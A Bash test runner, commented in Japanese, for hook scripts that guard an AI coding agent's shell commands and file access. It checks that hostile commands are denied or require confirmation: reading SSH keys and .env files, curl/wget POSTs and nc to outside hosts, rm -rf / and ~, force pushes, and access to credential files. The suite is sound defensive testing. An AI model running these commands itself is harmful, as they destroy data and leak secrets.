#!/bin/bash
# Antigravity フックスクリプトの単体テストランナー

set -uo pipefail

REPO_ROOT=$(cd "$(dirname "$0")/.." && pwd)
HOOKS_DIR="$REPO_ROOT/home/.gemini/config/hooks"

PASS=0
FAIL=0
TMP_BASE=$(mktemp -d)
trap 'rm -rf "$TMP_BASE"' EXIT

assert_decision() {
	local desc="$1"
	local hook="$2"
	local payload="$3"
	local expected="$4"
	local out=""
	local rc=0

	if [[ ! -x "$hook" ]]; then
		printf 'FAIL: %s (hook not executable: %s)\n' "$desc" "$hook"
		FAIL=$((FAIL + 1))
		return
	fi

	out=$(printf '%s' "$payload" | "$hook") || rc=$?
	if [[ $rc -ne 0 ]]; then
		printf 'FAIL: %s (exit=%d, out=%s)\n' "$desc" "$rc" "$out"
		FAIL=$((FAIL + 1))
		return
	fi

	local actual=""
	if [[ "$expected" == "{}" ]]; then
		if [[ "$out" == "{}" ]]; then
			PASS=$((PASS + 1))
		else
			printf 'FAIL: %s (expected={}, got=%s)\n' "$desc" "$out"
			FAIL=$((FAIL + 1))
		fi
		return
	fi

	actual=$(printf '%s' "$out" | jq -r '.decision // empty' 2>/dev/null)
	if [[ "$actual" == "$expected" ]]; then
		PASS=$((PASS + 1))
	else
		printf 'FAIL: %s (expected decision=%s, got=%s)\n' "$desc" "$expected" "$out"
		FAIL=$((FAIL + 1))
	fi
}

cmd_payload() {
	local cmd="$1"
	local cwd="${2:-$TMP_BASE}"
	jq -nc --arg cmd "$cmd" --arg cwd "$cwd" \
		'{toolCall:{name:"run_command",args:{CommandLine:$cmd}},cwd:$cwd}'
}

setup_git_repo() {
	local dir="$1"
	local branch="$2"
	mkdir -p "$dir"
	git -C "$dir" init -q -b "$branch"
	git -C "$dir" config user.email "test@example.com"
	git -C "$dir" config user.name "Test"
	printf 'hi\n' >"$dir/README.md"
	git -C "$dir" add README.md
	git -C "$dir" commit -q -m "init"
}

test_validate_command() {
	local hook="$HOOKS_DIR/validate-command.sh"
	local main_repo="$TMP_BASE/repo-main"
	local feat_repo="$TMP_BASE/repo-feat"
	setup_git_repo "$main_repo" "main"
	setup_git_repo "$feat_repo" "feat/test"

	# deny: 機密ファイル・.env
	assert_decision "deny ssh key" "$hook" "$(cmd_payload 'cat ~/.ssh/id_ed25519')" "deny"
	assert_decision "deny .env cat" "$hook" "$(cmd_payload 'cat .env')" "deny"
	assert_decision "deny .env.local source" "$hook" "$(cmd_payload 'source .env.local')" "deny"
	assert_decision "deny chained cat .env" "$hook" "$(cmd_payload 'echo ok; cat .env')" "deny"
	assert_decision "deny piped cat .env" "$hook" "$(cmd_payload 'cat .env|head')" "deny"
	assert_decision "deny backtick cat .env" "$hook" "$(cmd_payload 'echo `cat .env`')" "deny"

	# deny: 外部データ送信
	assert_decision "deny curl POST" "$hook" "$(cmd_payload 'curl -X POST https://example.com -d secret=1')" "deny"
	assert_decision "deny wget post" "$hook" "$(cmd_payload 'wget --post-data=a https://example.com')" "deny"
	assert_decision "deny nc" "$hook" "$(cmd_payload 'nc 1.2.3.4 80')" "deny"

	# deny: 破壊的ファイル操作
	assert_decision "deny rm -rf /" "$hook" "$(cmd_payload 'rm -rf /')" "deny"
	assert_decision "deny rm -rf ~" "$hook" "$(cmd_payload 'rm -rf ~')" "deny"
	assert_decision "deny rm -rf ~/" "$hook" "$(cmd_payload 'rm -rf ~/')" "deny"
	assert_decision "deny rm -rf quoted HOME" "$hook" "$(cmd_payload 'rm -rf "$HOME"')" "deny"
	assert_decision "deny rm -rf *" "$hook" "$(cmd_payload 'rm -rf *')" "deny"
	assert_decision "deny subshell rm -rf /" "$hook" "$(cmd_payload 'echo $(rm -rf /)')" "deny"
	assert_decision "deny chmod 777" "$hook" "$(cmd_payload 'chmod 777 foo')" "deny"

	# deny: 破壊的 git 操作・デフォルトブランチ直 push・Co-Authored-By
	assert_decision "deny git push -f" "$hook" "$(cmd_payload 'git push -f origin feat/x' "$feat_repo")" "deny"
	assert_decision "deny git push --force semicolon" "$hook" "$(cmd_payload 'git push --force; echo ok' "$feat_repo")" "deny"
	assert_decision "deny git push --force &&" "$hook" "$(cmd_payload 'git push --force&&echo ok' "$feat_repo")" "deny"
	assert_decision "deny git push --force-with-lease" "$hook" "$(cmd_payload 'git push --force-with-lease origin feat/x' "$feat_repo")" "deny"
	assert_decision "deny git push --force-with-lease &&" "$hook" "$(cmd_payload 'git push --force-with-lease&&echo ok' "$feat_repo")" "deny"
	assert_decision "deny subshell git push --force" "$hook" "$(cmd_payload 'echo $(git push --force)' "$feat_repo")" "deny"
	assert_decision "deny git push +refspec" "$hook" "$(cmd_payload 'git push origin +feat/x' "$feat_repo")" "deny"
	assert_decision "deny git push --mirror" "$hook" "$(cmd_payload 'git push --mirror origin' "$feat_repo")" "deny"
	assert_decision "deny git push origin main" "$hook" "$(cmd_payload 'git push origin main' "$feat_repo")" "deny"
	assert_decision "deny subshell git push origin main" "$hook" "$(cmd_payload 'echo $(git push origin main)' "$feat_repo")" "deny"
	assert_decision "deny git push HEAD:master" "$hook" "$(cmd_payload 'git push origin HEAD:master' "$feat_repo")" "deny"
	assert_decision "deny chained git push main" "$hook" "$(cmd_payload 'git status && git push origin main' "$feat_repo")" "deny"
	assert_decision "deny omitted push on main branch" "$hook" "$(cmd_payload 'git push' "$main_repo")" "deny"
	assert_decision "deny push origin HEAD on main branch" "$hook" "$(cmd_payload 'git push origin HEAD' "$main_repo")" "deny"
	assert_decision "deny push -u origin HEAD on main branch" "$hook" "$(cmd_payload 'git push -u origin HEAD' "$main_repo")" "deny"
	assert_decision "deny second chained omitted push on main" "$hook" "$(cmd_payload 'git push origin feat/x && git push' "$main_repo")" "deny"
	assert_decision "deny subshell omitted push on main" "$hook" "$(cmd_payload 'echo $(git push)' "$main_repo")" "deny"
	assert_decision "deny push -o skip-ci origin on main" "$hook" "$(cmd_payload 'git push -o skip-ci origin' "$main_repo")" "deny"
	assert_decision "deny git -C main_repo push" "$hook" "$(cmd_payload "git -C $main_repo push" "$feat_repo")" "deny"
	assert_decision "deny git reset --hard" "$hook" "$(cmd_payload 'git reset --hard HEAD~1' "$feat_repo")" "deny"
	assert_decision "deny git clean -fd" "$hook" "$(cmd_payload 'git clean -fd' "$feat_repo")" "deny"
	assert_decision "deny git branch -D" "$hook" "$(cmd_payload 'git branch -D old' "$feat_repo")" "deny"
	assert_decision "deny Co-Authored-By" "$hook" "$(cmd_payload 'git commit -m "feat: x\n\nCo-Authored-By: Bot <b@example.com>"' "$feat_repo")" "deny"

	# force_ask: 対外・不可逆操作
	assert_decision "force_ask gh pr merge" "$hook" "$(cmd_payload 'gh pr merge 123' "$feat_repo")" "force_ask"
	assert_decision "force_ask gh repo delete" "$hook" "$(cmd_payload 'gh repo delete foo/bar' "$feat_repo")" "force_ask"
	assert_decision "force_ask gh release create" "$hook" "$(cmd_payload 'gh release create v1.0.0' "$feat_repo")" "force_ask"
	assert_decision "force_ask npm publish" "$hook" "$(cmd_payload 'npm publish' "$feat_repo")" "force_ask"
	assert_decision "force_ask cargo publish" "$hook" "$(cmd_payload 'cargo publish' "$feat_repo")" "force_ask"
	assert_decision "force_ask twine upload" "$hook" "$(cmd_payload 'twine upload dist/*' "$feat_repo")" "force_ask"
	assert_decision "force_ask docker push" "$hook" "$(cmd_payload 'docker push myimg:latest' "$feat_repo")" "force_ask"

	# 許可 allow / BypassSandbox ask: feature ブランチ push・PR 作成・サンプル .env・通常コマンド・空入力
	assert_decision "allow omitted push on feat branch" "$hook" "$(cmd_payload 'git push' "$feat_repo")" "allow"
	assert_decision "allow push -u origin feat/test" "$hook" "$(cmd_payload 'git push -u origin feat/test' "$feat_repo")" "allow"
	assert_decision "allow gh pr create" "$hook" "$(cmd_payload 'gh pr create --title "feat: x" --body "y"' "$feat_repo")" "allow"
	assert_decision "allow cat .env.sample" "$hook" "$(cmd_payload 'cat .env.sample')" "allow"
	assert_decision "allow cat .env.example" "$hook" "$(cmd_payload 'cat .env.example')" "allow"
	assert_decision "allow cat .env.template" "$hook" "$(cmd_payload 'cat .env.template')" "allow"
	assert_decision "allow git status" "$hook" "$(cmd_payload 'git status' "$feat_repo")" "allow"
	assert_decision "allow curl GET" "$hook" "$(cmd_payload 'curl -s https://example.com')" "allow"
	assert_decision "allow empty payload" "$hook" "{}" "allow"

	# BypassSandbox: true は安全コマンドでも ask、危険コマンドは deny のまま
	local bypass_safe
	bypass_safe=$(jq -nc --arg cwd "$feat_repo" '{toolCall:{name:"run_command",args:{CommandLine:"git push -u origin feat/test",BypassSandbox:true}},cwd:$cwd}')
	assert_decision "ask safe command with BypassSandbox=true" "$hook" "$bypass_safe" "ask"
	local bypass_danger
	bypass_danger=$(jq -nc --arg cwd "$feat_repo" '{toolCall:{name:"run_command",args:{CommandLine:"git push -f origin feat/test",BypassSandbox:true}},cwd:$cwd}')
	assert_decision "deny dangerous command even with BypassSandbox=true" "$hook" "$bypass_danger" "deny"

	# jq 不在時の fail-safe (ask)
	local nojq_dir="$TMP_BASE/nojq"
	mkdir -p "$nojq_dir"
	local out_nojq=""
	if [[ -x "$hook" ]]; then
		out_nojq=$(printf '%s' "$(cmd_payload 'git status')" | PATH="$nojq_dir" /bin/bash "$hook" 2>/dev/null) || true
	fi
	if printf '%s' "$out_nojq" | jq -e '.decision == "ask"' >/dev/null 2>&1; then
		PASS=$((PASS + 1))
	else
		printf 'FAIL: validate-command missing jq should ask (got=%s)\n' "$out_nojq"
		FAIL=$((FAIL + 1))
	fi
}

file_payload() {
	local tool="$1"
	local key="$2"
	local path="$3"
	local ws="${4:-/repo}"
	jq -nc --arg tool "$tool" --arg key "$key" --arg path "$path" --arg ws "$ws" \
		'{toolCall:{name:$tool,args:{($key):$path}},workspacePaths:[$ws],artifactDirectoryPath:"/tmp/artifacts"}'
}

test_guard_sensitive_files() {
	local hook="$HOOKS_DIR/guard-sensitive-files.sh"

	# deny: CLI & IDE/2.0 ツール形式での機密ファイルアクセス
	assert_decision "deny read_file .ssh" "$hook" "$(file_payload 'read_file' 'Path' '/home/user/.ssh/id_ed25519')" "deny"
	assert_decision "deny view_file AbsolutePath .aws" "$hook" "$(file_payload 'view_file' 'AbsolutePath' '/home/user/.aws/credentials')" "deny"
	assert_decision "deny write_to_file TargetFile .env.local" "$hook" "$(file_payload 'write_to_file' 'TargetFile' '/repo/.env.local')" "deny"
	assert_decision "deny edit_file credentials.json" "$hook" "$(file_payload 'edit_file' 'Path' './config/credentials.json')" "deny"
	assert_decision "deny read_file server.key" "$hook" "$(file_payload 'read_file' 'Path' '/repo/certs/server.key')" "deny"
	assert_decision "deny read_file cert.pem" "$hook" "$(file_payload 'read_file' 'Path' '/repo/certs/cert.pem')" "deny"
	assert_decision "deny read_file .gnupg" "$hook" "$(file_payload 'read_file' 'Path' '~/.gnupg/secring.gpg')" "deny"
	assert_decision "deny read_file .npmrc" "$hook" "$(file_payload 'read_file' 'Path' '~/.npmrc')" "deny"
	assert_decision "deny read_file .git-credentials" "$hook" "$(file_payload 'read_file' 'Path' '~/.git-credentials')" "deny"

	# force_ask: シェル初期化ファイルの編集
	assert_decision "force_ask edit_file .zshrc" "$hook" "$(file_payload 'edit_file' 'Path' '/home/user/.zshrc')" "force_ask"
	assert_decision "force_ask write_to_file .bashrc" "$hook" "$(file_payload 'write_to_file' 'TargetFile' '~/.bashrc')" "force_ask"
	assert_decision "force_ask replace_file_content .profile" "$hook" "$(file_payload 'replace_file_content' 'TargetFile' '/home/user/.profile')" "force_ask"

	# 許可 allow / ワークスペース外書込 ask
	assert_decision "allow read_file .zshrc" "$hook" "$(file_payload 'read_file' 'Path' '/home/user/.zshrc')" "allow"
	assert_decision "allow read_file .env.sample" "$hook" "$(file_payload 'read_file' 'Path' '/repo/.env.sample')" "allow"
	assert_decision "allow read_file .env.example" "$hook" "$(file_payload 'read_file' 'Path' '/repo/.env.example')" "allow"
	assert_decision "allow read_file .env.template" "$hook" "$(file_payload 'read_file' 'Path' '/repo/.env.template')" "allow"
	assert_decision "allow edit_file inside workspace" "$hook" "$(file_payload 'edit_file' 'Path' '/repo/src/main.ts')" "allow"
	assert_decision "allow write_file inside artifacts" "$hook" "$(file_payload 'write_file' 'Path' '/tmp/artifacts/plan.md')" "allow"
	assert_decision "ask edit_file outside workspace" "$hook" "$(file_payload 'edit_file' 'Path' '/etc/hosts')" "ask"
	assert_decision "ask edit_file traversal from workspace" "$hook" "$(file_payload 'edit_file' 'Path' '/repo/../etc/hosts')" "ask"
	assert_decision "ask write_file traversal from /tmp" "$hook" "$(file_payload 'write_file' 'Path' '/tmp/../etc/hosts')" "ask"
	local empty_ws_payload
	empty_ws_payload=$(jq -nc '{toolCall:{name:"edit_file",args:{Path:"/etc/hosts"}},workspacePaths:[]}')
	assert_decision "ask edit_file absolute path when workspacePaths empty" "$hook" "$empty_ws_payload" "ask"
	assert_decision "allow guard empty payload" "$hook" "{}" "allow"

	# jq 不在時の fail-safe (ask)
	local nojq_dir="$TMP_BASE/nojq"
	mkdir -p "$nojq_dir"
	local out_nojq=""
	if [[ -x "$hook" ]]; then
		out_nojq=$(printf '%s' "$(file_payload 'read_file' 'Path' '/repo/src/main.ts')" | PATH="$nojq_dir" /bin/bash "$hook" 2>/dev/null) || true
	fi
	if printf '%s' "$out_nojq" | jq -e '.decision == "ask"' >/dev/null 2>&1; then
		PASS=$((PASS + 1))
	else
		printf 'FAIL: guard-sensitive-files missing jq should ask (got=%s)\n' "$out_nojq"
		FAIL=$((FAIL + 1))
	fi
}

assert_eq() {
	local desc="$1"
	local expected="$2"
	local actual="$3"
	if [[ "$actual" == "$expected" ]]; then
		PASS=$((PASS + 1))
	else
		printf 'FAIL: %s (expected=%q, got=%q)\n' "$desc" "$expected" "$actual"
		FAIL=$((FAIL + 1))
	fi
}

test_format_on_edit() {
	local hook="$HOOKS_DIR/format-on-edit.sh"
	local fmt_dir="$TMP_BASE/fmt"
	local mock_bin="$TMP_BASE/mock-fmt-bin"
	mkdir -p "$fmt_dir" "$mock_bin"

	# ノイズ付きモック shfmt（実行確認＋stdout 漏洩チェック）
	cat <<'EOF' >"$mock_bin/shfmt"
#!/bin/bash
echo "NOISY_STDOUT_SHOULD_BE_SUPPRESSED"
echo "NOISY_STDERR_SHOULD_BE_SUPPRESSED" >&2
if [[ "${1:-}" == "-w" && -n "${2:-}" && -f "$2" ]]; then
	printf '# formatted\n' >>"$2"
fi
EOF
	chmod +x "$mock_bin/shfmt"

	# 1. Path キー (.sh) のフォーマット＆厳密な {} 出力
	local sh_file="$fmt_dir/a.sh"
	printf 'echo hi\n' >"$sh_file"
	local payload_sh
	payload_sh=$(jq -nc --arg p "$sh_file" '{toolCall:{name:"edit_file",args:{Path:$p}}}')
	local out_sh=""
	if [[ -x "$hook" ]]; then
		out_sh=$(printf '%s' "$payload_sh" | PATH="$mock_bin:$PATH" "$hook") || true
	fi
	assert_eq "format-on-edit Path stdout exact {}" "{}" "$out_sh"
	if grep -q '^# formatted$' "$sh_file"; then
		PASS=$((PASS + 1))
	else
		printf 'FAIL: format-on-edit Path did not invoke formatter\n'
		FAIL=$((FAIL + 1))
	fi

	# 2. IDE/2.0 TargetFile キー (.sh) のフォーマット＆厳密な {} 出力
	local sh_file2="$fmt_dir/b.sh"
	printf 'echo hi\n' >"$sh_file2"
	local payload_target
	payload_target=$(jq -nc --arg p "$sh_file2" '{toolCall:{name:"write_to_file",args:{TargetFile:$p}}}')
	local out_target=""
	if [[ -x "$hook" ]]; then
		out_target=$(printf '%s' "$payload_target" | PATH="$mock_bin:$PATH" "$hook") || true
	fi
	assert_eq "format-on-edit TargetFile stdout exact {}" "{}" "$out_target"
	if grep -q '^# formatted$' "$sh_file2"; then
		PASS=$((PASS + 1))
	else
		printf 'FAIL: format-on-edit TargetFile did not invoke formatter\n'
		FAIL=$((FAIL + 1))
	fi

	# 3. error 付きペイロードでは変更せず {} を返す
	local sh_err="$fmt_dir/err.sh"
	printf 'echo err\n' >"$sh_err"
	local payload_err
	payload_err=$(jq -nc --arg p "$sh_err" '{toolCall:{name:"edit_file",args:{Path:$p}},error:"failed"}')
	local out_err=""
	if [[ -x "$hook" ]]; then
		out_err=$(printf '%s' "$payload_err" | PATH="$mock_bin:$PATH" "$hook") || true
	fi
	assert_eq "format-on-edit error payload stdout {}" "{}" "$out_err"
	if ! grep -q '^# formatted$' "$sh_err"; then
		PASS=$((PASS + 1))
	else
		printf 'FAIL: format-on-edit should skip when error is non-empty\n'
		FAIL=$((FAIL + 1))
	fi

	# 4. 存在しないファイルパスでは {} を返す
	local payload_missing
	payload_missing=$(jq -nc --arg p "$fmt_dir/does-not-exist.sh" '{toolCall:{name:"edit_file",args:{Path:$p}}}')
	assert_decision "format-on-edit missing file returns {}" "$hook" "$payload_missing" "{}"

	# 5. 設定なしプロジェクトの .ts ファイルは変更せず {} を返す
	local ts_file="$fmt_dir/sample.ts"
	printf 'const x=1\n' >"$ts_file"
	local payload_ts
	payload_ts=$(jq -nc --arg p "$ts_file" '{toolCall:{name:"edit_file",args:{Path:$p}}}')
	assert_decision "format-on-edit unconfigured ts returns {}" "$hook" "$payload_ts" "{}"
	assert_eq "format-on-edit unconfigured ts unchanged" "const x=1" "$(cat "$ts_file")"

	# 6. 相対パス指定を .cwd 基準で解決してフォーマットする
	mkdir -p "$fmt_dir/sub"
	local rel_file="$fmt_dir/sub/rel.sh"
	printf 'echo rel\n' >"$rel_file"
	local payload_rel
	payload_rel=$(jq -nc --arg cwd "$fmt_dir" '{toolCall:{name:"edit_file",args:{Path:"sub/rel.sh"}},cwd:$cwd}')
	local out_rel=""
	if [[ -x "$hook" ]]; then
		out_rel=$(printf '%s' "$payload_rel" | PATH="$mock_bin:$PATH" "$hook") || true
	fi
	assert_eq "format-on-edit relative Path via cwd stdout exact {}" "{}" "$out_rel"
	if grep -q '^# formatted$' "$rel_file"; then
		PASS=$((PASS + 1))
	else
		printf 'FAIL: format-on-edit did not resolve relative Path against cwd\n'
		FAIL=$((FAIL + 1))
	fi
}

test_notify_on_stop() {
	local hook="$HOOKS_DIR/notify-on-stop.sh"
	local mock_bin="$TMP_BASE/mock-notify-bin"
	local log_file="$TMP_BASE/notify.log"
	mkdir -p "$mock_bin"

	cat <<EOF >"$mock_bin/claude-notify.sh"
#!/bin/bash
printf 'notify:%s\n' "\$*" >>"$log_file"
echo "NOISY_NOTIFY_STDOUT"
EOF
	cat <<EOF >"$mock_bin/claude-tmux-notify.sh"
#!/bin/bash
printf 'tmux-notify\n' >>"$log_file"
echo "NOISY_TMUX_STDOUT"
EOF
	chmod +x "$mock_bin/claude-notify.sh" "$mock_bin/claude-tmux-notify.sh"

	# 1. モック通知コマンド存在時: 両方呼ばれ、stdout にノイズが漏れない
	local out_with=""
	if [[ -x "$hook" ]]; then
		out_with=$(printf '{"terminationReason":"NO_TOOL_CALL"}' | PATH="$mock_bin:$PATH" "$hook") || true
	fi
	assert_eq "notify-on-stop with mocks stdout exact {}" "{}" "$out_with"
	if [[ -f "$log_file" ]] && grep -q '^notify:' "$log_file" && grep -q '^tmux-notify$' "$log_file"; then
		PASS=$((PASS + 1))
	else
		printf 'FAIL: notify-on-stop did not invoke both notify scripts\n'
		FAIL=$((FAIL + 1))
	fi

	# 2. 通知コマンド不在時でも {} で exit 0
	local empty_bin="$TMP_BASE/empty-notify-bin"
	mkdir -p "$empty_bin"
	local out_without=""
	local rc_without=0
	if [[ -x "$hook" ]]; then
		out_without=$(printf '{"terminationReason":"NO_TOOL_CALL"}' | PATH="$empty_bin:/usr/bin:/bin" "$hook") || rc_without=$?
	else
		rc_without=1
	fi
	assert_eq "notify-on-stop without commands exit 0" "0" "$rc_without"
	assert_eq "notify-on-stop without commands stdout exact {}" "{}" "$out_without"
}

test_hooks_json() {
	local config_dir="$REPO_ROOT/home/.gemini/config"
	local hooks_json="$config_dir/hooks.json"

	if [[ -f "$hooks_json" ]] && jq empty "$hooks_json" >/dev/null 2>&1; then
		PASS=$((PASS + 1))
	else
		printf 'FAIL: hooks.json missing or invalid JSON: %s\n' "$hooks_json"
		FAIL=$((FAIL + 1))
		return
	fi

	local name=""
	for name in command-guard sensitive-file-guard format-on-edit notify-on-stop; do
		if jq -e --arg n "$name" 'has($n)' "$hooks_json" >/dev/null 2>&1; then
			PASS=$((PASS + 1))
		else
			printf 'FAIL: hooks.json missing named hook: %s\n' "$name"
			FAIL=$((FAIL + 1))
		fi
	done

	local cmd=""
	while IFS= read -r cmd; do
		if [[ -x "$config_dir/$cmd" ]]; then
			PASS=$((PASS + 1))
		else
			printf 'FAIL: hooks.json target not executable: %s\n' "$config_dir/$cmd"
			FAIL=$((FAIL + 1))
		fi
	done < <(jq -r '.. | objects | select(has("command")) | .command' "$hooks_json")
}

test_validate_command
test_guard_sensitive_files
test_format_on_edit
test_notify_on_stop
test_hooks_json

printf '\nSummary: %d passed, %d failed\n' "$PASS" "$FAIL"
[[ $FAIL -eq 0 ]]
